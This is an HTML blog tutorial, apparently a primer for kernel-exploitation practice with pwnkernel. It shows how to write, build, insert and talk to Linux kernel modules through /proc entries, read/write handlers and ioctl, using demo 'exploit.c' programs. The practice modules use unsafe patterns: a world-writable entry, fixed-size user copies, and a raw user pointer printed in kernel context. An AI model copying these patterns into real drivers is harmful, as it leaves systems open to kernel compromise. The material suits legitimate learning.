&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">challenge_release&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> inode &lt;span style="color:#f92672">*&lt;/span>inode, &lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp)
{
&lt;span style="color:#75715e">// when kernel module is released
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> file_operations fops &lt;span style="color:#f92672">=&lt;/span> {
.read &lt;span style="color:#f92672">=&lt;/span> challenge_read,
.write &lt;span style="color:#f92672">=&lt;/span> challenge_write,
.open &lt;span style="color:#f92672">=&lt;/span> challenge_open,
.release &lt;span style="color:#f92672">=&lt;/span> challenge_release
};
&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">init_module&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
&lt;span style="color:#75715e">// when the module is inserted into the kernel
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">cleanup_module&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
&lt;span style="color:#75715e">// when the module is removed from the kernel
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>One way to create a kernel module entry is to utilise the &lt;code>register_chrdev&lt;/code> function. This will assign what is called a &amp;lsquo;major number&amp;rsquo; to the kernel module, allowing us to create a kernel module entry under the &amp;lsquo;/dev/&amp;rsquo; directory. The &lt;code>unregister_chrdev&lt;/code> function is used to remove the kernel module entry.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">init_module&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
major_number &lt;span style="color:#f92672">=&lt;/span> register_chrdev(&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;challenge&amp;#34;&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>fops);
&lt;span style="color:#66d9ef">if&lt;/span> (major_number &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;span style="color:#66d9ef">return&lt;/span> major_number;
printk(KERN_INFO &lt;span style="color:#e6db74">&amp;#34;create device with: &amp;#39;mknod /dev/challenge c %d 0&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, major_number);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">cleanup_module&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
unregister_chrdev(major_number, &lt;span style="color:#e6db74">&amp;#34;challenge&amp;#34;&lt;/span>);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can create an entry in the &amp;lsquo;/dev/&amp;rsquo; directory with the command below.&lt;/p>
&lt;pre>&lt;code>/ # mknod /dev/&amp;lt;module name&amp;gt; c &amp;lt;major number&amp;gt; 0
&lt;/code>&lt;/pre>&lt;p>An even simpler way to initialise a kernel module entry is via the &lt;code>proc_create&lt;/code> function. It creates a kernel module entry under the &amp;lsquo;/proc/&amp;rsquo; directory. It does not require any further user input to set up. The &lt;code>proc_remove&lt;/code> function is used to remove the kernel module entry.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">struct&lt;/span> proc_dir_entry &lt;span style="color:#f92672">*&lt;/span>proc_entry;
&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">init_module&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
proc_entry &lt;span style="color:#f92672">=&lt;/span> proc_create(&lt;span style="color:#e6db74">&amp;#34;challenge&amp;#34;&lt;/span>, &lt;span style="color:#ae81ff">0666&lt;/span>, NULL, &lt;span style="color:#f92672">&amp;amp;&lt;/span>fops);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">cleanup_module&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
&lt;span style="color:#66d9ef">if&lt;/span> (proc_entry) {
proc_remove(proc_entry);
}
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>While the &lt;code>read&lt;/code> and &lt;code>write&lt;/code> functions are often great for kernel module interaction, there is another utility that we can use if we need even greater control over our input, this being &lt;code>ioctl&lt;/code>.&lt;/p>
&lt;p>It takes two main arguments an &lt;code>ioctl_num&lt;/code> and an &lt;code>ioctl_param&lt;/code>, where the &lt;code>ioctl_num&lt;/code> can be used (for example) to specify various tasks, and the &lt;code>ioctl_param&lt;/code> can be used to provide something like a pointer to an array or struct.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#a6e22e">challenge_ioctl&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>filp, &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> ioctl_num, &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> ioctl_param)
{
&lt;span style="color:#75715e">// when interacted with via ioctl
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> file_operations fops &lt;span style="color:#f92672">=&lt;/span> {
.read &lt;span style="color:#f92672">=&lt;/span> challenge_read,
.write &lt;span style="color:#f92672">=&lt;/span> challenge_write,
.unlocked_ioctl &lt;span style="color:#f92672">=&lt;/span> challenge_ioctl,
.open &lt;span style="color:#f92672">=&lt;/span> challenge_open,
.release &lt;span style="color:#f92672">=&lt;/span> challenge_release
};
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="compiling-kernel-modules">Compiling Kernel Modules&lt;/h2>
&lt;p>As mentioned before, pwnkernel makes the process of compiling new kernel modules very simple. Just move your kernel module source code to the &amp;lsquo;src/&amp;rsquo; directory within pwnkernel. Make sure you update the makefile within the same &amp;lsquo;src/&amp;rsquo; directory, as this is what is used to compile your kernel module.&lt;/p>
&lt;p>See the below makefile for reference.&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="1" type="checkbox" />
&lt;label for="1">
&lt;span class="collapsable-code__language">makefile&lt;/span>
&lt;span class="collapsable-code__title">Makefile&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-makefile" >&lt;code>
# add more modules here!
obj-m = challenge.o
KERNEL_VERSION=5.4
all:
echo $(OBJECTS)
make -C ../linux-$(KERNEL_VERSION) M=$(PWD) modules
clean:
make -C ../linux-$(KERNEL_VERSION) M=$(PWD) clean
&lt;/code>&lt;/pre>
&lt;/div>
&lt;p>After updating the makefile, building a new kernel module is as simple as running the below commands.&lt;/p>
&lt;pre>&lt;code>~/ $ mv challenge.c ~/pwnkernel/src/challenge.c
~/ $ mv Makefile ~/pwnkernel/src/challenge.c
~/ $ cd pwnkernel/
~/pwnkernel $ ./build.sh
...
&lt;/code>&lt;/pre>&lt;h2 id="inserting-kernel-modules">Inserting Kernel Modules&lt;/h2>
&lt;p>Before you can interact with your freshly compiled kernel module, it needs to be inserted into the kernel itself. Below is a pre-written kernel module that will be used for the purposes of this exercise. Compile it and run the launch script to start.&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="2" type="checkbox" checked />
&lt;label for="2">
&lt;span class="collapsable-code__language">c&lt;/span>
&lt;span class="collapsable-code__title">challenge.c&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-c" >&lt;code>
#include &amp;lt;linux/kernel.h&amp;gt;
#include &amp;lt;linux/module.h&amp;gt;
#include &amp;lt;linux/fs.h&amp;gt;
#include &amp;lt;linux/proc_fs.h&amp;gt;
#include &amp;lt;linux/uaccess.h&amp;gt;
MODULE_LICENSE(&amp;#34;GPL&amp;#34;);
struct proc_dir_entry *proc_entry;
static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *off)
{
return -EINVAL;
}
static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, loff_t *off)
{
return -EINVAL;
}
static int challenge_open(struct inode *inode, struct file *fp)
{
printk(KERN_ALERT &amp;#34;device &amp;#39;/proc/challenge&amp;#39; opened&amp;#34;);
return 0;
}
static int challenge_release(struct inode *inode, struct file *fp)
{
printk(KERN_ALERT &amp;#34;device &amp;#39;/proc/challenge&amp;#39; closed&amp;#34;);
return 0;
}
static struct file_operations fops = {
.read = challenge_read,
.write = challenge_write,
.open = challenge_open,
.release = challenge_release
};
int init_module(void)
{
proc_entry = proc_create(&amp;#34;challenge&amp;#34;, 0666, NULL, &amp;amp;fops);
printk(KERN_ALERT &amp;#34;module &amp;#39;/proc/challenge&amp;#39; created&amp;#34;);
return 0;
}
void cleanup_module(void)
{
if (proc_entry) {
proc_remove(proc_entry);
}
printk(KERN_ALERT &amp;#34;module &amp;#39;/proc/challenge&amp;#39; removed&amp;#34;);
}
&lt;/code>&lt;/pre>
&lt;/div>
&lt;p>Once we&amp;rsquo;ve compiled the above and started the kernel virtual machine, it&amp;rsquo;s as simple as running the &lt;code>insmod&lt;/code> command to insert the kernel module. There are other commands to do this such as &lt;code>modprobe&lt;/code>, which is better at resolving dependencies, but for this kernel module &lt;code>insmod&lt;/code> is sufficient.&lt;/p>
&lt;p>Running &lt;code>dmesg&lt;/code> we can see that the &lt;code>init_module&lt;/code> function was executed when we inserted the kernel module.&lt;/p>
&lt;pre>&lt;code>/ # insmod ./challenge.ko
/ # dmesg
...
[ 8.437878] challenge: loading out-of-tree module taints kernel.
[ 8.445662] module '/proc/challenge' created
&lt;/code>&lt;/pre>&lt;h2 id="interacting-with-file-based-operations">Interacting with File-based Operations&lt;/h2>
&lt;p>The majority of user interaction with kernel modules is done via file-based operations. Once the kernel module entry has been opened, the module has function handlers for read and write operations. For the sake of simplicity, you can think of this as a kind of file-based socket.&lt;/p>
&lt;p>Interaction is performed first by opening the module entry. When you read from that open file descriptor the kernel module&amp;rsquo;s &lt;code>read&lt;/code> handler is called. When you write to the open file descriptor the kernel module&amp;rsquo;s &lt;code>write&lt;/code> handler is called.&lt;/p>
&lt;p>Below is a pre-written kernel module that can be used for this exercise.&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="3" type="checkbox" checked />
&lt;label for="3">
&lt;span class="collapsable-code__language">c&lt;/span>
&lt;span class="collapsable-code__title">challenge.c&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-c" >&lt;code>
#include &amp;lt;linux/kernel.h&amp;gt;
#include &amp;lt;linux/module.h&amp;gt;
#include &amp;lt;linux/fs.h&amp;gt;
#include &amp;lt;linux/proc_fs.h&amp;gt;
#include &amp;lt;linux/uaccess.h&amp;gt;
MODULE_LICENSE(&amp;#34;GPL&amp;#34;);
struct proc_dir_entry *proc_entry;
static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *off)
{
char data[18] = &amp;#34;Here&amp;#39;s some data!&amp;#34;;
copy_to_user(buf, data, 18);
return 0;
}
static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, loff_t *off)
{
char data[16];
copy_from_user(data, buf, 16);
printk(KERN_ALERT &amp;#34;Message: &amp;#39;%s&amp;#39;.\n&amp;#34;, data);
return 0;
}
static int challenge_open(struct inode *inode, struct file *fp)
{
printk(KERN_ALERT &amp;#34;device &amp;#39;/proc/challenge&amp;#39; opened&amp;#34;);
return 0;
}
static int challenge_release(struct inode *inode, struct file *fp)
{
printk(KERN_ALERT &amp;#34;device &amp;#39;/proc/challenge&amp;#39; closed&amp;#34;);
return 0;
}
static struct file_operations fops = {
.read = challenge_read,
.write = challenge_write,
.open = challenge_open,
.release = challenge_release
};
int init_module(void)
{
proc_entry = proc_create(&amp;#34;challenge&amp;#34;, 0666, NULL, &amp;amp;fops);
printk(KERN_ALERT &amp;#34;module &amp;#39;/proc/challenge&amp;#39; created&amp;#34;);
return 0;
}
void cleanup_module(void)
{
if (proc_entry) {
proc_remove(proc_entry);
}
printk(KERN_ALERT &amp;#34;module &amp;#39;/proc/challenge&amp;#39; removed&amp;#34;);
}
&lt;/code>&lt;/pre>
&lt;/div>
&lt;p>The below proof-of-concept code will do a few things to demonstrate how read / write actions are handled within the kernel module:&lt;/p>
&lt;ul>
&lt;li>It will first open the module entry with read/write access.&lt;/li>
&lt;li>Then it&amp;rsquo;ll perform a read, reading from the kernel module (calling its &lt;code>read&lt;/code> handler function).&lt;/li>
&lt;li>Then it&amp;rsquo;ll perform a write, writing to the kernel module (calling its &amp;lsquo;write` handler function).&lt;/li>
&lt;li>Finally it&amp;rsquo;ll close the file descriptor.&lt;/li>
&lt;/ul>
&lt;div class="collapsable-code">
&lt;input id="4" type="checkbox" />
&lt;label for="4">
&lt;span class="collapsable-code__language">c&lt;/span>
&lt;span class="collapsable-code__title">exploit.c&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-c" >&lt;code>
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;assert.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
int main(int argc, char** argv)
{
/* open the device */
int fd = open(&amp;#34;/proc/challenge&amp;#34;, O_RDWR);
assert(fd &amp;gt; 0);
/* perform a read */
char output[32];
read(fd, output, sizeof(char) * 32);
puts(output);
/* perform a write */
char input[32] = &amp;#34;Hello, World!&amp;#34;;
write(fd, input, sizeof(char) * 32);
/* close the device */
close(fd);
return 0;
}
&lt;/code>&lt;/pre>
&lt;/div>
&lt;pre>&lt;code>~/ $ gcc exploit.c -o exploit -static
&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s start by inserting the kernel module and running our demonstration code. Running &lt;code>dmesg&lt;/code> afterwards we can see the result of our read / write actions.&lt;/p>
&lt;pre>&lt;code>/ # insmod ./challenge.ko
/ # ./exploit
Here's some data!
&lt;/code>&lt;/pre>&lt;pre>&lt;code>/ # dmesg
...
[ 12.547802] challenge: loading out-of-tree module taints kernel.
[ 12.557454] module '/proc/challenge' created
[ 18.904788] device '/proc/challenge' opened
[ 18.909735] Message: 'Hello, World!'.
[ 18.911169] device '/proc/challenge' closed
&lt;/code>&lt;/pre>&lt;h2 id="interacting-with-ioctl">Interacting with IOCTL&lt;/h2>
&lt;p>As mentioned before, ioctl can provide us with much greater control over the way we interact with the kernel. Below is an example kernel module that will perform different actions depending on the input provided.&lt;/p>
&lt;p>Here is a pre-written kernel module that you can use for this exercise.&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="5" type="checkbox" checked />
&lt;label for="5">
&lt;span class="collapsable-code__language">c&lt;/span>
&lt;span class="collapsable-code__title">challenge.c&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-c" >&lt;code>
#include &amp;lt;linux/kernel.h&amp;gt;
#include &amp;lt;linux/module.h&amp;gt;
#include &amp;lt;linux/fs.h&amp;gt;
#include &amp;lt;linux/proc_fs.h&amp;gt;
#include &amp;lt;linux/uaccess.h&amp;gt;
#define HELLO _IO(&amp;#39;p&amp;#39;, 1)
#define GOODBYE _IO(&amp;#39;p&amp;#39;, 2)
MODULE_LICENSE(&amp;#34;GPL&amp;#34;);
struct proc_dir_entry *proc_entry;
static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *off)
{
return -EINVAL;
}
static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, loff_t *off)
{
return -EINVAL;
}
static int challenge_open(struct inode *inode, struct file *fp)
{
printk(KERN_ALERT &amp;#34;device &amp;#39;/proc/challenge&amp;#39; opened\n&amp;#34;);
return 0;
}
static int challenge_release(struct inode *inode, struct file *fp)
{
printk(KERN_ALERT &amp;#34;device &amp;#39;/proc/challenge&amp;#39; closed\n&amp;#34;);
return 0;
}
static long challenge_ioctl(struct file *filp, unsigned int ioctl_num, unsigned long ioctl_param)
{
if (ioctl_num == HELLO) {
printk(KERN_ALERT &amp;#34;Hello, %s!\n&amp;#34;, (char *)ioctl_param);
}
else if (ioctl_num == GOODBYE) {
printk(KERN_ALERT &amp;#34;Goodbye, %s!\n&amp;#34;, (char *)ioctl_param);
}
return 0;
}
static struct file_operations fops = {
.read = challenge_read,
.write = challenge_write,
.unlocked_ioctl = challenge_ioctl,
.open = challenge_open,
.release = challenge_release
};
int init_module(void)
{
proc_entry = proc_create(&amp;#34;challenge&amp;#34;, 0666, NULL, &amp;amp;fops);
printk(KERN_ALERT &amp;#34;module &amp;#39;/proc/challenge&amp;#39; created\n&amp;#34;);
return 0;
}
void cleanup_module(void)
{
if (proc_entry) {
proc_remove(proc_entry);
}
printk(KERN_ALERT &amp;#34;module &amp;#39;/proc/challenge&amp;#39; removed\n&amp;#34;);
}
&lt;/code>&lt;/pre>
&lt;/div>
&lt;p>After compiling our kernel module we&amp;rsquo;ll want to check the values of &lt;code>HELLO&lt;/code> and &lt;code>GOODBYE&lt;/code>, so we can send them to the module via ioctl. We can see that &lt;code>HELLO = 0x7001&lt;/code> and &lt;code>GOODBYE = 0x7002&lt;/code>.&lt;/p>
&lt;pre>&lt;code>~/pwnkernel $ objdump -d src/challenge.ko -M intel
...
000000000000001e &amp;lt;challenge_ioctl&amp;gt;:
1e: 41 54 push r12
20: 48 c7 c7 00 00 00 00 mov rdi,0x0
27: 49 89 d4 mov r12,rdx
2a: 55 push rbp
2b: 89 f5 mov ebp,esi
2d: e8 00 00 00 00 call 32 &amp;lt;challenge_ioctl+0x14&amp;gt;
32: 81 fd 01 70 00 00 cmp ebp,0x7001
38: 75 11 jne 4b &amp;lt;challenge_ioctl+0x2d&amp;gt;
3a: 4c 89 e6 mov rsi,r12
3d: 48 c7 c7 00 00 00 00 mov rdi,0x0
44: e8 00 00 00 00 call 49 &amp;lt;challenge_ioctl+0x2b&amp;gt;
49: eb 27 jmp 72 &amp;lt;challenge_ioctl+0x54&amp;gt;
4b: 81 fd 02 70 00 00 cmp ebp,0x7002
51: 75 11 jne 64 &amp;lt;challenge_ioctl+0x46&amp;gt;
53: 4c 89 e6 mov rsi,r12
56: 48 c7 c7 00 00 00 00 mov rdi,0x0
5d: e8 00 00 00 00 call 62 &amp;lt;challenge_ioctl+0x44&amp;gt;
62: eb 0e jmp 72 &amp;lt;challenge_ioctl+0x54&amp;gt;
64: 89 ee mov esi,ebp
66: 48 c7 c7 00 00 00 00 mov rdi,0x0
6d: e8 00 00 00 00 call 72 &amp;lt;challenge_ioctl+0x54&amp;gt;
72: 31 c0 xor eax,eax
74: 5d pop rbp
75: 41 5c pop r12
77: c3 ret
...
&lt;/code>&lt;/pre>&lt;p>Below is an example interaction with the above kernel module, it&amp;rsquo;ll do several things:&lt;/p>
&lt;ul>
&lt;li>First it&amp;rsquo;ll open the kernel module entry with read/write access.&lt;/li>
&lt;li>Next it&amp;rsquo;ll send the &lt;code>ioctl_num&lt;/code> for the &lt;code>HELLO&lt;/code> command, with a string pointer as the &lt;code>ioctl_param&lt;/code>.&lt;/li>
&lt;li>Next it&amp;rsquo;ll send the &lt;code>ioctl_num&lt;/code> for the &lt;code>HELLO&lt;/code> command, with a string pointer as the &lt;code>ioctl_param&lt;/code>.&lt;/li>
&lt;li>Finally it&amp;rsquo;ll close the file descriptor.&lt;/li>
&lt;/ul>
&lt;div class="collapsable-code">
&lt;input id="6" type="checkbox" />
&lt;label for="6">
&lt;span class="collapsable-code__language">c&lt;/span>
&lt;span class="collapsable-code__title">exploit.c&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-c" >&lt;code>
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;assert.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;sys/ioctl.h&amp;gt;
#define HELLO 0x7001
#define GOODBYE 0x7002
int main(int argc, char** argv)
{
/* open the device */
int fd = open(&amp;#34;/proc/challenge&amp;#34;, O_RDWR);
assert(fd &amp;gt; 0);
/* interact with ioctl here */
char name[7] = &amp;#34;Anvbis&amp;#34;;
ioctl(fd, HELLO, name);
ioctl(fd, GOODBYE, name);
/* close the device */
close(fd);
return 0;
}
&lt;/code>&lt;/pre>
&lt;/div>
&lt;pre>&lt;code>~/ $ gcc exploit.c -o exploit -static
&lt;/code>&lt;/pre>&lt;p>After running our exploit, and checking &lt;code>dmesg&lt;/code>, we can see that the kernel printed &amp;ldquo;Hello, Anvbis!&amp;rdquo; and &amp;ldquo;Goodbye, Anvbis!&amp;rdquo; as per the instructions we sent it via ioctl.&lt;/p>
&lt;pre>&lt;code>/ # insmod ./challenge.ko
/ # ./exploit
&lt;/code>&lt;/pre>&lt;pre>&lt;code>/ # dmesg
...
[ 12.187784] device '/proc/challenge' opened
[ 12.188714] Hello, Anvbis!
[ 12.189492] Goodbye, Anvbis!
[ 12.189747] device '/proc/challenge' closed
&lt;/code>&lt;/pre>&lt;h2 id="appendix">Appendix&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://linux-kernel-labs.github.io/refs/heads/master/labs/kernel_modules.html">The Linux Kernel Documentation - Kernel Modules&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://students.mimuw.edu.pl/SO/Linux-doc/lkmpg.pdf">The Linux Kernel Programming Guide - Talking to Device Files&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://sysplay.github.io/books/LinuxDrivers/book/Content/Part09.html">LinuxDrivers - I/O Control in Linux&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://sysplay.github.io/books/LinuxDrivers/book/Content/Part17.html">LinuxDrivers - Module Interactions&lt;/a>&lt;/li>
&lt;/ul></content></item></channel></rss>